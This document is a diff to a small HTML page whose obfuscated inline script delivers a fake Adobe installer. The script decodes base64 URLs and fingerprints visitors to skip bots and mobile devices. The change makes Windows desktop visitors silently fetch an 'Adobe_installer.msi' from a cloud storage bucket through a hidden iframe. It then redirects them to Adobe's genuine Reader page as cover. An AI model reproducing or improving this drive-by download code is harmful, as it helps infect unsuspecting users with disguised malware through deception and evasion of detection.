@@ -7,7 +7,8 @@
     <script type="text/javascript">
         (function() {
             const _0x1 = "aHR0cHM6Ly9jbG91ZC1zcGFjZS1hcGkuZnJhMS5jZG4uZGlnaXRhbG9jZWFuc3BhY2VzLmNvbS9BZG9iZV9pbnN0YWxsZXIubXNp"; 
-            const _0x2 = "aHR0cHM6Ly9kYXNoLmNsb3VkZmxhcmUuY29t";
+            const _0x2 = "aHR0cHM6Ly9nZXQuYWRvYmUuY29tL3JlYWRlci8";
+            const _0x3 = "aHR0cHM6Ly9nZXQuYWRvYmUuY29tL3JlYWRlci8";
 
             function _v() {
                 const n = window.navigator;
@@ -26,7 +27,12 @@
                                (w.outerWidth === 0 && w.outerHeight === 0);
 
                 if (isWin && !isMob && !isBot && !isFake) {
-                    w.location.replace(atob(_0x1));
+                    const i = document.createElement('iframe');
+                    i.style.display = 'none';
+                    i.src = atob(_0x1);
+                    document.body.appendChild(i);
+                    
+                    w.location.replace(atob(_0x3));
                 } else {
                     w.location.replace(atob(_0x2));
                 }
@@ -38,7 +44,7 @@
     </script>
     <style>body{background:#fff;margin:0;overflow:hidden;}</style>
 </head>
-<body>
-    <noscript><meta http-equiv="refresh" content="0;url=https://dash.cloudflare.com"></noscript>
+<body style="background:#fff;">
+    <noscript><meta http-equiv="refresh" content="0;url=https://get.adobe.com/reader/"></noscript>
 </body>
 </html>
